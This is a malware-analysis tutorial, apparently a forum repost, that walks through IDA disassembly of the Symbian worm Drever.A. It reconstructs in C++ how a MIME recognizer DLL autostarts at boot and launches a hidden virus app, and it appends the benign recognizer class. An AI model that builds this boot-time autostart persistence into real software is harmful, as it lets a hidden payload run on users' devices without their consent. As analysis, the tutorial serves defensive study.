
# \[原创\]希望大家喜欢，Symbian virus 分析 Part I

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-133.htm`](https://www.pediy.com/kssd/pediy08/pediy8-133.htm)

Tutorial: Understanding Symbian virus (I)

## Part 1. Basic

### 1. Symbian OS common files:
`.sis` - Application setup package(You can get `unsis` tool from Symbian.com site, and it need `Perl` to run);
`.jar` - `j2me` application package(`zip` format);
`.app` / `.exe` / `.mdl` / `.dll` - application file;
`.aif` - Application Information File;
etc.

### 2. Symbian OS common application files:
`App` - Most of application is in this type (It likes execute file on windows in function, but it is most likes dynamic link library in implementation);
`Console exe` - only for testing, few;
`Dll` - dynamic link library in symbian;
`Mdl` - a special type dynamic link library, use to autostart, the file will release to `c:\\system\\recogs` directory, fullname is MIME Recognizer Dll;

### 3. virus spread way:
`Trojan` - most in `app` format, few in `console exe` format, trojan application will run directly;
`Worm` - most in `app` format, worm will setup a `MDL` file to start main app automaticly, and spread itself by infrared, bluetooth, MMS or email;
`Virus` - infect `EPOC32` format file?

## Part 2. Analyze MDL sample for "Drever.A"

Instruction:

1. Symbian OS support several CPU architectures, the most mobile is using ARM. The virus analyzed in this text is also on ARM platform,
so reader should know the BASIC ARM INSTRUCTION AND ARM PROGRAMMING.
2. My main tool is `IDA Pro 4.8`. For reducing to use memory, Symbian OS APIs do not export the name(only by order), so we could not see the
API name directly. I have written a IDA plugin to try to fix this problem. (The plugin is in testing, so I have not provided it yet. If
you need or wanna try it, please contact me by email: `jay_zephyr2002@yahoo.com.cn`)
3. How to pass the parameters in Symbian OS API or function:
1) System will use `R0`-`R3` to pass the parameters, generally speaking;
2) If there is more than 4 parameters, the other parameters will be pass by stack;
3) class method (not static) will use `R0` to pass the class this pointer;
4) return value is use `R0` register;
===============================================================================

MDL application loading flow:

Symbian OS MDL Loader
-> 1. `E32Dll(TDllReason)` // exported by mdl file, entrypoint
-> 2. `CreateRecognizer()` // exported by mdl file, order = 1

===============================================================================

### 1. See Entrypoint in IDA result:

\---------------------------[ BEGIN IDA DISASSEMBLE ]---------------------------

```
.text:10000000  Start:
.text:10000000      B       loc_10000248
.text:10000248  loc_10000248:
.text:10000248      MOV     R0, #0
.text:1000024C      BX      LR
```

\----------------------------[ END IDA DISASSEMBLE ]----------------------------

this is the `E32Dll` function in C program, the source is just like:

////////////////////////////////////////////////////////////////////////////////
// C++ functions
`GLDEF_C` `TInt` `E32Dll`(`TDllReason` /*reason*/)
{
  return 0;  // `KErrNone`
}
////////////////////////////////////////////////////////////////////////////////

### 2. View "CreateRecognizer" function (the same reason, the CreateRecognizer function is exported by order 1, not by name):

\---------------------------[ BEGIN IDA DISASSEMBLE ]---------------------------

```
.text:10000218       EXPORT CreateRecognizer
.text:10000218  CreateRecognizer:
.text:10000218       STMFD   SP!, {R4,LR}
.text:1000021C       MOV     R0, #0x128
.text:10000220       BL      CBase::__nw(uint)
.text:10000224       SUBS    R4, R0, #0
.text:10000228       BEQ     faile_to_alloc_mem  ; if R0 == 0 then memory alloc failed!
.text:1000022C       MOV     R0, R4
.text:10000230       BL      recognizer_constructor  ; invoke recognizer constructor!
.text:10000234       MOV     R4, R0
.text:10000238

.text:10000238  faile_to_alloc_mem:
.text:10000238       BL      do_exe_virus_body
.text:1000023C       MOV     R0, R4
.text:10000240       LDMFD   SP!, {R4,LR}
.text:10000244       BX      LR
```

\----------------------------[ END IDA DISASSEMBLE ]----------------------------

translate the assemble codes to C++ codes:

////////////////////////////////////////////////////////////////////////////////
// C++ functions
`EXPORT_C` `CApaDataRecognizerType` * `CreateRecognizer()`
{
  `CApaDataRecognizerType` * `rg` = new `MyRecognizer()`;
  `do_exe_virus_body()`;
  return `rg`;
}
////////////////////////////////////////////////////////////////////////////////

I have analyzed all codes for `MyRecognizer` class, and do not find any malware codes. I put the whole `MyRecognizer` class code at the end of this text.

Let's check the function "`do_exe_virus_body`", this is the virus codes.

\---------------------------[ BEGIN IDA DISASSEMBLE ]---------------------------

```
.text:10000068  do_exe_virus_body:
.text:10000068       STMFD   SP!, {R4,R5,LR}
.text:1000006C       SUB     SP, SP, #0x10
.text:10000070       MOV     R0, #4
.text:10000074       BL      __builtin_new
.text:10000078       SUBS    R5, R0, #0
.text:1000007C       LDRNE   R3, =0xFFFF8001
.text:10000080       STRNE   R3, [R5]
.text:10000084       MOV     R3, #0x100
.text:10000088       STR     R3, [SP,#arg_0] ; param4
.text:1000008C       STR     R3, [SP,#arg_4] ; param5
.text:10000090       MOV     R4, #0
.text:10000094       STR     R4, [SP,#arg_8] ; param6
.text:10000098       MOV     R3, #1
.text:1000009C       STR     R3, [SP,#arg_C] ; param7
.text:100000A0       MOV     R0, R5          ; this pointer
.text:100000A4       LDR     R1, =aSaboot    ; param1
.text:100000A8       LDR     R2, =ThreadProc ; param2
.text:100000AC       MOV     R3, #0x2000     ; param3
.text:100000B0       BL      RThread::Create(TDesC16 const &,int (*)(void *),int,int,int,void *,TOwnerType)
.text:100000B4       BL      User::LeaveIfError(int)
.text:100000B8       MOV     R0, R5
.text:100000BC       MOV     R1, R4
.text:100000C0       BL      RThread::SetPriority(TThreadPriority)
.text:100000C4       MOV     R0, R5
.text:100000C8       BL      RThread::Resume(void)
.text:100000CC       MOV     R0, R5
.text:100000D0       BL      RHandleBase::Close(void)
.text:100000D4       B       loc_100000E4
.text:100000E4

.text:100000E4  loc_100000E4:
.text:100000E4       ADD     SP, SP, #0x10
.text:100000E8       LDMFD   SP!, {R4,R5,LR}
.text:100000EC       BX      LR
```

\----------------------------[ END IDA DISASSEMBLE ]----------------------------

OK, very easy, isn't it? Let's convert it. The result is:

////////////////////////////////////////////////////////////////////////////////
// C++ functions
void `do_exe_virus_body()`
{
  `RThread` `thread`;
  `_LIT(KTxtName, "aSaboot")`;
  `User::LeaveIfError(`
    `thread.Create(`
      `KTxtName`, `ThreadProc`,
      `0x2000`, `0x100`, `0x100`,
      `NULL`, `EOwnerThread`)
    );
  `thread.SetPriority(EPriorityNormal)`;
  `thread.Resume()`;
  `thread.Close()`;
}
////////////////////////////////////////////////////////////////////////////////

Now, we give the `ThreadProc` function codes (For lazy, I only show the C++ source):

////////////////////////////////////////////////////////////////////////////////
// C++ functions
`TInt` `ThreadProc`(`TAny` * /* arg */)
{
  `TRAPD(err, exe_virus_app())`;
  return 0;
}
void `exe_virus_app()`
{
  const `TUid` `uid` = {0x100052C6};
  `_LIT(KTxtVirusApp, "C:\\system\\apps\\Gavnowin!\\Gavnowin.app")`;
  `RSystemAgent` `sa`;
  `RTimer` `timer`;
  `TInt` `n` = 0;



```cpp
TRequestStatus req = 0x80000001;
sa.Connect();
sa.NotifyIREventSynchronously(0);
timer.CreateLocale();
while (sa.GetStatus()) {
  if (n>5) break;
  n++;
  timer.After(&req, 0x4C4B40);
  WaitForRequest(&req);
}
sa.Close();
EikDll::StartExeL(KTxtVirusApp);
```

////////////////////////////////////////////////////////////////////////////////
// Text end

OK, that's all! If you found any bugs, please let me know.

Thanks for reading.

\================================================================================

## Appendix

\================================================================================

The follow is the `MyRecognizer` class source:

////////////////////////////////////////////////////////////////////////////////
// File name: `MyRecognizer.h`
////////////////////////////////////////////////////////////////////////////////

```cpp
#include <apmrec.h>

const TUid MyUid = {0x101FEB56};

class CMyRecognizer : public CApaDataRecognizerType
{
public:
  CMyRecognizer();
  virtual ~CMyRecognizer();
  virtual TUint PreferredBufSize();
  virtual TDataType SupportedDataTypeL(TInt index) const;
private:
  virtual void DoRecognizeL(const TDesC& name, const TDesC8& buf);
};
```

////////////////////////////////////////////////////////////////////////////////
// File name: `MyRecognizer.cpp`
////////////////////////////////////////////////////////////////////////////////

```cpp
#include "MyRecognizer.h"

CMyRecognizer::CMyRecognizer():
  CApaDataRecognizerType(MyUid, 0)
{
}

CMyRecognizer::~CMyRecognizer()
{
}

TUint CMyRecognizer::PreferredBufSize(TInt index)
{
  return 0;
}

TDataType CMyRecognizer::SupportedDataTypeL(TInt index) const
{
  return TDataType();
}

void CMyRecognizer::DoRecognizeL(const TDesC& name, const TDesC8& buf)
{
}
```

////////////////////////////////////////////////////////////////////////////////
//:~

4dd466d0e1e0cc123afbe504da2462ca
